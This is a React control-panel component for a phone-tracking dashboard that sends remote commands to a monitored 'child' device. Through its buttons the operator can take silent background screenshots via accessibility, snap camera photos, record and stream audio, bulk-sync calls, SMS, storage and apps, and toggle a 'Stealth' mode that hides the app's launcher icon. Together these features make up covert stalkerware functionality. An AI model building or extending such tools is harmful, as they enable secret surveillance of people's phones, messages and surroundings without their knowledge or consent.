import React, { useState } from 'react';
import { Play, Square, Camera, Mic, Clock, Send, RefreshCw, ChevronDown, ChevronUp, Zap, Smartphone, Bell, HardDrive, PhoneCall, Trash2, EyeOff } from 'lucide-react';
import { sendCommand, updateDeviceMonitoring, triggerTorchToggle, triggerChatOverlay, triggerSyncEverything } from '../services/trackerService';

export default function ControlPanel({ currentDevice, onRequestDeleteDevice }) {
  const [loadingAction, setLoadingAction] = useState(null);
  const [audioDuration, setAudioDuration] = useState(10);
  const [intervalSec, setIntervalSec] = useState(15);
  const [useFrontCamera, setUseFrontCamera] = useState(false);
  const [isTorchOn, setIsTorchOn] = useState(false);
  const [commandHistory, setCommandHistory] = useState([]);
  const [statusNote, setStatusNote] = useState('');
  const [isHistoryExpanded, setIsHistoryExpanded] = useState(false);

  const deviceId = currentDevice?.deviceId || 'dev_preview_nexus';

  const handleAction = async (action, parameters = {}) => {
    try {
      setLoadingAction(action);
      setStatusNote(`Sending ${action}...`);

      const cmd = await sendCommand(deviceId, action, parameters);
      setStatusNote(`Command ${action} dispatched successfully!`);

      setCommandHistory(prev => [
        {
          id: cmd.id || Date.now(),
          action,
          parameters,
          status: 'PENDING',
          time: new Date().toLocaleTimeString()
        },
        ...prev.slice(0, 9)
      ]);

      if (action === 'START_TRACKING') {
        await updateDeviceMonitoring(deviceId, true);
      } else if (action === 'STOP_TRACKING') {
        await updateDeviceMonitoring(deviceId, false);
      }
    } catch (err) {
      console.error('Command dispatch error:', err);
      setStatusNote(`Error: ${err.message}`);
    } finally {
      setLoadingAction(null);
    }
  };

  const handleToggleTorch = async () => {
    try {
      setLoadingAction('TOGGLE_TORCH');
      const nextState = !isTorchOn;
      await triggerTorchToggle(deviceId, nextState);
      setIsTorchOn(nextState);
      setStatusNote(`Flashlight turned ${nextState ? 'ON' : 'OFF'}`);
      setCommandHistory(prev => [
        {
          id: Date.now(),
          action: nextState ? 'TORCH_ON' : 'TORCH_OFF',
          parameters: { enabled: nextState },
          status: 'PENDING',
          time: new Date().toLocaleTimeString()
        },
        ...prev.slice(0, 9)
      ]);
    } catch (err) {
      setStatusNote(`Torch error: ${err.message}`);
    } finally {
      setLoadingAction(null);
    }
  };

  const handleChatOverlay = async () => {
    try {
      setLoadingAction('SHOW_CHAT_OVERLAY');
      await triggerChatOverlay(deviceId);
      setStatusNote('Chat overlay dialog displayed on child screen!');
      setCommandHistory(prev => [
        {
          id: Date.now(),
          action: 'SHOW_CHAT_OVERLAY',
          parameters: {},
          status: 'PENDING',
          time: new Date().toLocaleTimeString()
        },
        ...prev.slice(0, 9)
      ]);
    } catch (err) {
      setStatusNote(`Overlay error: ${err.message}`);
    } finally {
      setLoadingAction(null);
    }
  };

  const handleSyncAll = async () => {
    try {
      setLoadingAction('SYNC_ALL');
      await triggerSyncEverything(deviceId);
      setStatusNote('Full synchronization dispatched (Calls, SMS, Storage, Apps)!');
      setCommandHistory(prev => [
        {
          id: Date.now(),
          action: 'SYNC_EVERYTHING',
          parameters: {},
          status: 'PENDING',
          time: new Date().toLocaleTimeString()
        },
        ...prev.slice(0, 9)
      ]);
    } catch (err) {
      setStatusNote(`Sync error: ${err.message}`);
    } finally {
      setLoadingAction(null);
    }
  };

  return (
    <div className="bg-slate-900 border border-slate-800 rounded-xl sm:rounded-2xl p-4 sm:p-6 shadow-xl flex flex-col justify-between h-full space-y-4 sm:space-y-6">
      <div>
        <div className="flex items-center justify-between pb-3 sm:pb-4 border-b border-slate-800 mb-4 sm:mb-5">
          <div className="flex items-center space-x-2">
            <Send className="w-4 h-4 sm:w-5 sm:h-5 text-cyan-400" />
            <h2 className="text-base sm:text-lg font-bold text-white tracking-wide">Remote Hardware Control</h2>
          </div>
          <div className="flex items-center space-x-2">
            <span className="text-[10px] sm:text-xs px-2.5 py-1 rounded-full font-mono bg-cyan-950/60 text-cyan-300 border border-cyan-800/40 truncate max-w-[140px]">
              {deviceId}
            </span>
            {currentDevice && onRequestDeleteDevice && (
              <button
                onClick={() => onRequestDeleteDevice(currentDevice)}
                className="p-1 sm:py-1 sm:px-2 rounded-lg bg-rose-950/40 hover:bg-rose-900/60 border border-rose-800/40 text-rose-300 hover:text-white text-xs font-semibold flex items-center space-x-1 transition-colors"
                title="Remove this device from dashboard"
              >
                <Trash2 className="w-3.5 h-3.5 text-rose-400" />
                <span className="hidden sm:inline text-[11px]">Remove</span>
              </button>
            )}
          </div>
        </div>

        {/* Status notice */}
        {statusNote && (
          <div className="mb-4 text-xs px-3 py-2 rounded-lg bg-slate-800/80 border border-cyan-500/30 text-cyan-300 flex items-center justify-between">
            <span className="truncate mr-2">{statusNote}</span>
            <button onClick={() => setStatusNote('')} className="text-slate-400 hover:text-white shrink-0">✕</button>
          </div>
        )}

        {/* Primary Monitoring Controls */}
        <div className="grid grid-cols-2 gap-2 sm:gap-3 mb-4">
          <button
            onClick={() => handleAction('START_TRACKING')}
            disabled={loadingAction === 'START_TRACKING'}
            className="flex items-center justify-center space-x-1.5 sm:space-x-2 py-3 px-3 sm:px-4 rounded-xl font-semibold text-xs sm:text-sm transition-all bg-emerald-600 hover:bg-emerald-500 active:bg-emerald-700 text-white shadow-lg shadow-emerald-950/40 active:scale-95 disabled:opacity-50 touch-manipulation"
          >
            {loadingAction === 'START_TRACKING' ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4 fill-current shrink-0" />}
            <span className="truncate">Start Tracking</span>
          </button>

          <button
            onClick={() => handleAction('STOP_TRACKING')}
            disabled={loadingAction === 'STOP_TRACKING'}
            className="flex items-center justify-center space-x-1.5 sm:space-x-2 py-3 px-3 sm:px-4 rounded-xl font-semibold text-xs sm:text-sm transition-all bg-rose-600 hover:bg-rose-500 active:bg-rose-700 text-white shadow-lg shadow-rose-950/40 active:scale-95 disabled:opacity-50 touch-manipulation"
          >
            {loadingAction === 'STOP_TRACKING' ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Square className="w-4 h-4 fill-current shrink-0" />}
            <span className="truncate">Stop Tracking</span>
          </button>
        </div>

        {/* Quick Quick Actions: Torch & Sync All */}
        <div className="grid grid-cols-2 gap-2 mb-4">
          {/* Torch Switch */}
          <button
            onClick={handleToggleTorch}
            disabled={loadingAction === 'TOGGLE_TORCH'}
            className={`py-2.5 px-3 rounded-xl border text-xs font-bold flex items-center justify-center space-x-2 transition-all ${
              isTorchOn
                ? 'bg-amber-500 text-black border-amber-400 shadow-lg shadow-amber-500/30'
                : 'bg-slate-800/80 hover:bg-slate-700 border-slate-700 text-slate-200'
            }`}
          >
            <Zap className={`w-4 h-4 ${isTorchOn ? 'fill-current animate-pulse' : 'text-amber-400'}`} />
            <span>{isTorchOn ? 'Torch ON' : 'Torch OFF'}</span>
          </button>

          {/* Sync Everything */}
          <button
            onClick={handleSyncAll}
            disabled={loadingAction === 'SYNC_ALL'}
            className="py-2.5 px-3 rounded-xl bg-cyan-600/80 hover:bg-cyan-500 border border-cyan-500 text-white font-bold text-xs flex items-center justify-center space-x-1.5 transition-colors shadow-md disabled:opacity-50"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loadingAction === 'SYNC_ALL' ? 'animate-spin' : ''}`} />
            <span>Sync All Data</span>
          </button>
        </div>

        {/* Hardware Triggers */}
        <div className="space-y-3 sm:space-y-4 mb-4 sm:mb-6">
          <h3 className="text-[11px] sm:text-xs font-semibold uppercase tracking-wider text-slate-400">Screen, Camera & Audio Capture</h3>

          {/* Mobile Screen Screenshot Trigger */}
          <div className="p-3 sm:p-3.5 rounded-xl bg-slate-800/80 border border-slate-700/80 space-y-2.5">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <Smartphone className="w-4 h-4 text-emerald-400 shrink-0" />
                <span className="text-xs sm:text-sm font-semibold text-white">Live Screen Screenshot</span>
              </div>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-emerald-950/80 text-emerald-300 border border-emerald-800/40">
                Silent A11y
              </span>
            </div>
            <p className="text-[11px] text-slate-400">
              Captures the live mobile screen silently in the background and saves directly to Media Vault.
            </p>
            <button
              onClick={() => handleAction('CAPTURE_SCREENSHOT')}
              disabled={loadingAction === 'CAPTURE_SCREENSHOT'}
              className="w-full py-2.5 px-3 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-bold flex items-center justify-center space-x-2 transition-all active:scale-95 disabled:opacity-50"
            >
              {loadingAction === 'CAPTURE_SCREENSHOT' ? (
                <RefreshCw className="w-3.5 h-3.5 animate-spin" />
              ) : (
                <Smartphone className="w-3.5 h-3.5" />
              )}
              <span>Take Screen Screenshot</span>
            </button>
          </div>

          {/* Snapshot Trigger with Front/Back selector */}
          <div className="p-3 sm:p-3.5 rounded-xl bg-slate-800/80 border border-slate-700/80 space-y-2.5">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <Camera className="w-4 h-4 text-cyan-400 shrink-0" />
                <span className="text-xs sm:text-sm font-semibold text-white">Remote Camera Snapshot</span>
              </div>
              <div className="flex items-center bg-slate-950 p-0.5 rounded-lg border border-slate-800 text-[11px]">
                <button
                  onClick={() => setUseFrontCamera(false)}
                  className={`px-2 py-0.5 rounded font-medium transition-colors ${
                    !useFrontCamera ? 'bg-cyan-500 text-black font-bold' : 'text-slate-400'
                  }`}
                >
                  Back
                </button>
                <button
                  onClick={() => setUseFrontCamera(true)}
                  className={`px-2 py-0.5 rounded font-medium transition-colors ${
                    useFrontCamera ? 'bg-cyan-500 text-black font-bold' : 'text-slate-400'
                  }`}
                >
                  Front
                </button>
              </div>
            </div>

            <button
              onClick={() => handleAction('TAKE_SNAPSHOT', { useFrontCamera })}
              disabled={loadingAction === 'TAKE_SNAPSHOT'}
              className="w-full py-2.5 px-3 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-black text-xs font-bold flex items-center justify-center space-x-2 transition-all active:scale-95 disabled:opacity-50"
            >
              {loadingAction === 'TAKE_SNAPSHOT' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Camera className="w-3.5 h-3.5" />}
              <span>Snap {useFrontCamera ? 'Front (Selfie)' : 'Back Camera'} Photo</span>
            </button>
          </div>

          {/* Audio Recorder Trigger */}
          <div className="p-3 sm:p-3.5 rounded-xl bg-slate-800/80 border border-slate-700/80 space-y-2.5">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <Mic className="w-4 h-4 text-purple-400 shrink-0" />
                <span className="text-xs sm:text-sm font-semibold text-white">Record Audio Clip</span>
              </div>
              <div className="flex items-center space-x-1 sm:space-x-1.5 text-xs">
                {[5, 10, 30].map(sec => (
                  <button
                    key={sec}
                    onClick={() => setAudioDuration(sec)}
                    className={`px-2 py-0.5 rounded-md font-medium text-[11px] sm:text-xs transition-all ${
                      audioDuration === sec
                        ? 'bg-purple-600 text-white font-bold'
                        : 'bg-slate-700 text-slate-300 hover:bg-slate-600'
                    }`}
                  >
                    {sec}s
                  </button>
                ))}
              </div>
            </div>

            <button
              onClick={() => handleAction('RECORD_AUDIO', { duration: audioDuration })}
              disabled={loadingAction === 'RECORD_AUDIO'}
              className="w-full py-2.5 px-3 rounded-lg bg-purple-600 hover:bg-purple-500 active:bg-purple-700 text-white text-xs font-semibold flex items-center justify-center space-x-2 transition-all active:scale-95 disabled:opacity-50"
            >
              {loadingAction === 'RECORD_AUDIO' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Mic className="w-3.5 h-3.5" />}
              <span>Record & Stream {audioDuration}s Audio</span>
            </button>
          </div>

          {/* Interactive Controls: Chat, Siren, Stealth Mode */}
          <div className="grid grid-cols-3 gap-2">
            <button
              onClick={handleChatOverlay}
              disabled={loadingAction === 'SHOW_CHAT_OVERLAY'}
              className="py-2.5 px-2 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-semibold text-slate-200 flex items-center justify-center space-x-1 transition-colors disabled:opacity-50"
              title="Pops up live chat overlay directly over child device screen"
            >
              <Smartphone className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
              <span className="truncate">Chat Pop</span>
            </button>

            <button
              onClick={() => handleAction('RING_PHONE')}
              disabled={loadingAction === 'RING_PHONE'}
              className="py-2.5 px-2 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-semibold text-slate-200 flex items-center justify-center space-x-1 transition-colors disabled:opacity-50"
            >
              <Bell className="w-3.5 h-3.5 text-amber-400 shrink-0" />
              <span className="truncate">Siren</span>
            </button>

            <button
              onClick={() => handleAction('TOGGLE_STEALTH')}
              disabled={loadingAction === 'TOGGLE_STEALTH'}
              className="py-2.5 px-2 rounded-xl bg-slate-800 hover:bg-slate-700 border border-amber-500/30 text-xs font-semibold text-amber-300 hover:text-white flex items-center justify-center space-x-1 transition-colors disabled:opacity-50"
              title="Toggle Stealth Mode (Hide/Show launcher icon on phone)"
            >
              <EyeOff className="w-3.5 h-3.5 text-amber-400 shrink-0" />
              <span className="truncate">Stealth</span>
            </button>
          </div>

          {/* Interval Selector */}
          <div className="p-3 sm:p-3.5 rounded-xl bg-slate-800/80 border border-slate-700/80">
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center space-x-1.5 text-xs font-semibold text-slate-300">
                <Clock className="w-3.5 h-3.5 text-cyan-400" />
                <span>Tracking Ping Rate</span>
              </div>
              <span className="text-xs font-mono text-cyan-400 font-bold">{intervalSec}s</span>
            </div>
            <div className="grid grid-cols-4 gap-1.5">
              {[5, 15, 30, 60].map(sec => (
                <button
                  key={sec}
                  onClick={() => {
                    setIntervalSec(sec);
                    handleAction('SET_INTERVAL', { interval: sec });
                  }}
                  className={`py-1.5 rounded-lg text-xs font-medium transition-all ${
                    intervalSec === sec
                      ? 'bg-cyan-500 text-black font-bold'
                      : 'bg-slate-700/70 text-slate-300 hover:bg-slate-700'
                  }`}
                >
                  {sec}s
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Sent Commands History */}
      <div className="pt-2 border-t border-slate-800/80">
        <button
          onClick={() => setIsHistoryExpanded(!isHistoryExpanded)}
          className="w-full flex items-center justify-between text-[11px] sm:text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2 py-1"
        >
          <span>Recent Dispatches ({commandHistory.length})</span>
          <span className="sm:hidden text-cyan-400">
            {isHistoryExpanded ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
          </span>
        </button>

        <div className={`space-y-1.5 max-h-36 overflow-y-auto pr-1 ${isHistoryExpanded ? 'block' : 'hidden sm:block'}`}>
          {commandHistory.length === 0 ? (
            <div className="text-xs text-slate-500 italic py-1">No commands sent in this session</div>
          ) : (
            commandHistory.map(cmd => (
              <div key={cmd.id} className="flex items-center justify-between text-xs p-2 rounded-lg bg-slate-800/50 border border-slate-800">
                <div className="flex items-center space-x-2 truncate">
                  <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 shrink-0"></span>
                  <span className="font-mono text-slate-200 truncate">{cmd.action}</span>
                </div>
                <div className="flex items-center space-x-2 text-slate-400 text-[11px] shrink-0 ml-2">
                  <span>{cmd.time}</span>
                  <span className="text-amber-400 font-medium">{cmd.status}</span>
                </div>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
}
